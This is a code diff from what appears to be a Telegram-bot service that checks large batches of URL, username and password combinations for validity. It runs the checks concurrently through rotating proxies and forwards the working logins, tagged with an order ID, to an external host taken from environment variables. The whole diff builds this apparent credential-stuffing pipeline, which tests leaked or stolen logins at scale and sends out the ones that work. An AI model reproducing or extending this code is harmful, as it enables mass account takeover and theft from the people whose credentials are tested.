@@ -1,6 +1,6 @@
 import asyncio
 from datetime import datetime
-from typing import List
+from typing import List, Dict
 
 import aiohttp
 import os
@@ -65,6 +65,18 @@ async def validate_credentials(data: list, validator: AsyncValidator):
     return new_result
 
 
+async def short_validate_credentials(data: list, validator: AsyncValidator):
+    connector = aiohttp.TCPConnector(limit=int(os.getenv('CONNECTIONS')))
+    tasks = []
+    async with aiohttp.ClientSession(connector=connector) as session:
+        for item in data:
+            task = asyncio.ensure_future(validator.validate_credentials(session=session, user=item))
+            tasks.append(task)
+        result = asyncio.gather(*tasks)
+        new_result = await result
+    return new_result
+
+
 async def validate_proxy(proxy: str, session: aiohttp.ClientSession):
     try:
         async with session.get("https://google.com",
@@ -91,7 +103,7 @@ async def validate_proxies(data: List[str]):
         return {'result': False}
 
 
-def to_list_of_lists(credentials: List[Credential], chunk_size: int) -> List[List[Credential]]:
+def to_list_of_lists(credentials: list, chunk_size: int) -> List[list]:
     result = []
     while len(credentials) > 0:
         if len(credentials) > chunk_size:
@@ -175,6 +187,59 @@ def validate(scan_file_id: str, scan_file_path: str, user_id: id, lang: str, act
         chat_id=user_id, document=text_file, caption=message
     )
     user_repo.add_to_count(tele_id=user_id, amount=file_result['amount'])
+
+
+def sort_remote_credentials(credentials: list) -> List[List[User]]:
+    data = [
+        User(
+                {
+                    'url': item['url'],
+                    'path': 'something',
+                    'credentials': {
+                        'user': item['user'],
+                        'pass': item['pass'],
+                    }
+                }
+        )
+        for item in credentials
+    ]
+    data = to_list_of_lists(
+        credentials=data,
+        chunk_size=CHUNK_SIZE,
+    )
+    return data
+
+
+@app.task
+def validate_remote_credentials(credentials: list, order_id: int):
+    data = sort_remote_credentials(credentials)
+    proxy_data = asyncio.run(validate_proxies(proxies))
+    validator = AsyncApiValidator(
+        proxy_data['proxy'],
+        timeout=TIMEOUT,
+        valid_timeout=TIMEOUT_VALID
+    )
+    semy_result = [
+        asyncio.run(short_validate_credentials(item, validator)) for item in data
+    ]
+    semy_semy_result = []
+    for item in semy_result:
+        semy_semy_result += item
+    result = [
+        {
+            'url': item['url'],
+            'user': item['credentials']['user'],
+            'pass': item['credentials']['pass'],
+        } for item in semy_semy_result if item['result'] == 0
+    ]
+    data_json = {
+        'order_id': order_id,
+        'result': result
+    }
+    requests.post(
+        url=f'{os.getenv("OTHER_HOST")}/api/{os.getenv("OTHER_TOKEN")}/order_check',
+        json=data_json,
+    )
 
 
 async def send_document(chat_id: int, document: InputFile, caption: str):
